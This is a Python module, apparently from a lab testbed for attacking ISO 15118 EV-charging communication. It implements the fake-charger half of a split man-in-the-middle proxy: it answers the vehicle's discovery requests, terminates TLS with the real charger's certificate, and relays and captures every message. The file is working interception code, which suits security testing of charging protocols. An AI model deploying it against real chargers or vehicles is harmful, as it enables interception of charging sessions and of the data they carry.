"""
Evil_SECC -- the fake-charger half of the split HLC MITM.

Sits on proxy_net2, next to the real EVCC, and genuinely terminates the HLC
session as a real SECC would: its own SDP response (not a rewrite of a real
SECC's response -- there is no real SECC on this leg), its own TLS/plain TCP
server, using the real SECC's own certificate/key via
iso15118.shared.security.get_ssl_context(), the same call the real SECC
itself makes. Because TLS is genuinely terminated here (not passed through
opaquely like proxy01.py's single-relay design), --debug/--tamper work on
TLS/PnC and ISO 15118-20 sessions too, not just plaintext -2 ones.

Everything received from the real EVCC is forwarded to its counterpart,
Evil_EVCC (proxy/evil_evcc.py), over a private bridge_net connection (see
proxy/common.py's write_json_frame/read_json_frame); everything Evil_EVCC
hands back (what the real SECC sent) is forwarded on to the real EVCC. See
README "Split proxy (Evil_SECC + Evil_EVCC)" for the full topology.

One HLC session at a time, same simplifying assumption proxy01.py already
makes (a single real EVCC/SECC pair, one charging session at a time) -- not
a general-purpose multi-session proxy.
"""

import sys, os, json, socket, asyncio, datetime, argparse, ipaddress

# --------------------------------------------------------------------
# CLI options
# --------------------------------------------------------------------
parser = argparse.ArgumentParser(description="Evil_SECC -- fake-charger half of the split HLC MITM")
parser.add_argument("--capture", action="store_true", help="Save packets to evil_secc_capture.log")
parser.add_argument("--show-hex", action="store_true", help="Print packet hex previews")
parser.add_argument("--debug", action="store_true",
                     help="Print decoded EXI for EVCC->SECC messages as they're relayed. "
                          "Same effect as DEBUG=1.")
parser.add_argument("--evcc-iface", metavar="IFACE",
                     help="Explicit interface name facing the real EVCC, used instead of "
                          "auto-detecting by Docker subnet (proxy_net2). For real hardware.")
parser.add_argument("--bridge-host", default=os.environ.get("BRIDGE_HOST", "Evil_EVCC"),
                     help="Hostname/IP of Evil_EVCC on bridge_net (default: Evil_EVCC, the "
                          "compose service name -- override via BRIDGE_HOST env var or this "
                          "flag for a non-compose setup).")
parser.add_argument("--bridge-port", type=int, default=int(os.environ.get("BRIDGE_PORT", "6000")),
                     help="TCP port Evil_EVCC's bridge_net listener is on (default: 6000).")
args = parser.parse_args()

CAPTURE_FILE = "evil_secc_capture.log"
SHOW_PACKET_HEX = args.show_hex
ENABLE_CAPTURE = args.capture
DEBUG_EXI = args.debug or os.environ.get("DEBUG") == "1"

# --------------------------------------------------------------------
# Project setup
# --------------------------------------------------------------------
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from common import (
    ProxyCodec, decode_with_fallback, discover_secc_evcc_interfaces,
    read_v2gtp_message, write_json_frame, read_json_frame,
)
from iso15118.shared.messages.sdp import SDPRequest, Security, create_sdp_response
from iso15118.shared.messages.v2gtp import V2GTPMessage
from iso15118.shared.messages.enums import ISOV2PayloadTypes, Protocol
from iso15118.shared.security import get_ssl_context
from iso15118.shared.settings import load_shared_settings

# Populates iso15118.shared.settings.shared_settings (PKI_PATH, ENABLE_TLS_1_3,
# ...) from the environment / .env file -- get_ssl_context() reads straight
# out of that dict and raises KeyError if it was never populated. The real
# SECC (iso15118/secc/main.py) calls this itself on startup; since we import
# get_ssl_context directly rather than going through main.py, we call it
# ourselves instead. Same env vars as the real SECC/EVCC processes
# (PKI_PATH defaults to the iso15118 package's own shared/pki/ dir, which is
# where create_certs.sh/regen_certs.sh already generate/sync certs).
load_shared_settings()

LISTEN_HOST = '::'
UDP_PORT = 15118
TCP_PORT = 55000  # own HLC port offered in the SDP response, same as proxy01.py's proxy_port


def log_and_capture(direction, data):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    print(f"[{ts}] {direction} {len(data)} bytes")
    if SHOW_PACKET_HEX:
        hex_preview = data.hex()
        if len(hex_preview) > 128:
            hex_preview = hex_preview[:128] + "..."
        print(f"    {hex_preview}")
    if ENABLE_CAPTURE:
        with open(CAPTURE_FILE, "a") as f:
            f.write(f"{ts} {direction} len={len(data)} data={data.hex()}\n")


async def handle_evcc_connection(evcc_reader, evcc_writer, bridge_reader, bridge_writer):
    """Relay one HLC session between the real EVCC and Evil_EVCC (over the bridge)."""
    addr = evcc_writer.get_extra_info('peername')
    print(f"\nAccepted TCP connection from EVCC: {addr}")

    codec = ProxyCodec() if DEBUG_EXI else None

    async def evcc_to_bridge():
        while True:
            try:
                header, payload = await read_v2gtp_message(evcc_reader)
            except asyncio.IncompleteReadError:
                break
            if codec:
                decoded, ns = await decode_with_fallback(codec, payload)
                if decoded is not None:
                    print(f"\n[EVCC→SECC] Decoded EXI (ns={ns}):\n{json.dumps(decoded, indent=4)}\n")
            data = header + payload
            log_and_capture("EVCC→SECC", data)
            await write_json_frame(bridge_writer, {
                "type": "v2gtp", "direction": "evcc_to_secc",
                "header": header.hex(), "payload": payload.hex(),
            })

    async def bridge_to_evcc():
        while True:
            try:
                msg = await read_json_frame(bridge_reader)
            except asyncio.IncompleteReadError:
                break
            if msg.get("type") != "v2gtp" or msg.get("direction") != "secc_to_evcc":
                continue
            data = bytes.fromhex(msg["header"]) + bytes.fromhex(msg["payload"])
            evcc_writer.write(data)
            await evcc_writer.drain()
            log_and_capture("SECC→EVCC", data)

    try:
        await asyncio.gather(evcc_to_bridge(), bridge_to_evcc())
    except Exception as e:
        print(f"Relay error: {e}")
    finally:
        evcc_writer.close()
        await evcc_writer.wait_closed()
        print(f"Closed connection with {addr}")


async def run(own_ip, own_scope_id, bridge_host, bridge_port):
    udp_sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    udp_sock.bind((LISTEN_HOST, UDP_PORT))
    udp_sock.setblocking(True)
    print(f"\nUDP SDP responder listening on [{LISTEN_HOST}]:{UDP_PORT}")

    loop = asyncio.get_running_loop()
    def blocking_recv(): return udp_sock.recvfrom(4096)

    local_ips = {own_ip}
    own_ip_packed = ipaddress.IPv6Address(own_ip).packed

    while True:
        data, client_addr = await loop.run_in_executor(None, blocking_recv)
        if client_addr[0] in local_ips:
            continue

        try:
            # Protocol.UNKNOWN for the incoming datagram -- same as the real
            # SECC's own process_incoming_udp_packet(): SDP itself is
            # version-agnostic, exchanged before either side knows if this
            # will become a -2 or -20 session.
            v2gtp_msg = V2GTPMessage.from_bytes(Protocol.UNKNOWN, data)
            if v2gtp_msg.payload_type != ISOV2PayloadTypes.SDP_REQUEST:
                raise ValueError(f"not an SDPRequest (payload_type={v2gtp_msg.payload_type})")
            sdp_request = SDPRequest.from_payload(v2gtp_msg.payload)
        except Exception as e:
            print(f"Ignoring non-SDP-request datagram from {client_addr}: {e}")
            continue

        print(f"\nReceived SDP Request from {client_addr}: {sdp_request}")

        print(f"Connecting to Evil_EVCC bridge at {bridge_host}:{bridge_port} ...")
        try:
            bridge_reader, bridge_writer = await asyncio.open_connection(bridge_host, bridge_port)
        except Exception as e:
            print(f"Could not reach Evil_EVCC bridge: {e} -- dropping this SDP request")
            continue

        await write_json_frame(bridge_writer, {
            "type": "sdp_request", "security": int(sdp_request.security),
        })
        try:
            reply = await read_json_frame(bridge_reader)
        except asyncio.IncompleteReadError:
            print("Evil_EVCC bridge connection closed before replying -- dropping this SDP request")
            continue

        if reply.get("type") != "secc_ready":
            print(f"Evil_EVCC could not reach the real SECC "
                  f"({reply.get('reason', 'unknown reason')}) -- not answering this SDP request")
            bridge_writer.close()
            continue

        tls_enabled = sdp_request.security == Security.TLS
        print(f"Evil_EVCC is ready (real SECC reachable); starting our own "
              f"{'TLS' if tls_enabled else 'plain TCP'} server for the real EVCC")

        ssl_context = get_ssl_context(True) if tls_enabled else None
        session_done = asyncio.Event()

        async def _handle(r, w):
            try:
                await handle_evcc_connection(r, w, bridge_reader, bridge_writer)
            finally:
                session_done.set()

        server = await asyncio.start_server(_handle, host=LISTEN_HOST, port=TCP_PORT, ssl=ssl_context)

        sdp_response = create_sdp_response(sdp_request, own_ip_packed, TCP_PORT, tls_enabled)
        # Protocol.ISO_15118_2 + the explicit SDP_RESPONSE payload type,
        # matching the real SECC's own SDPResponse construction exactly
        # (comm_session_handler.py's process_incoming_udp_packet).
        response_bytes = V2GTPMessage(
            Protocol.ISO_15118_2, ISOV2PayloadTypes.SDP_RESPONSE, sdp_response.to_payload()
        ).to_bytes()
        udp_sock.sendto(response_bytes, client_addr)
        print(f"Sent our own SDP response to EVCC at {client_addr}: {sdp_response}")

        async with server:
            await session_done.wait()
            server.close()
            await server.wait_closed()

        bridge_writer.close()
        await bridge_writer.wait_closed()
        print("\nSession complete -- listening for the next SDP request\n")


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    roles = loop.run_until_complete(discover_secc_evcc_interfaces(evcc_iface=args.evcc_iface))

    detect_desc = "explicit --evcc-iface" if args.evcc_iface else "Docker subnet auto-detect"
    print(f"\nEVCC-facing network interface (identified by {detect_desc}):")

    if "evcc" not in roles:
        if args.evcc_iface:
            print(f"ERROR: --evcc-iface {args.evcc_iface} did not resolve to a usable interface")
        else:
            print("ERROR: no interface found on the EVCC subnet (172.19.0.0/16 / "
                  "2001:db8:2::/64) -- on real hardware, pass --evcc-iface instead.")
        sys.exit(1)

    own_ip, own_scope_id = roles["evcc"]
    print(f"  evcc: {own_ip} -> scope {own_scope_id}")

    loop.run_until_complete(run(own_ip, own_scope_id, args.bridge_host, args.bridge_port))
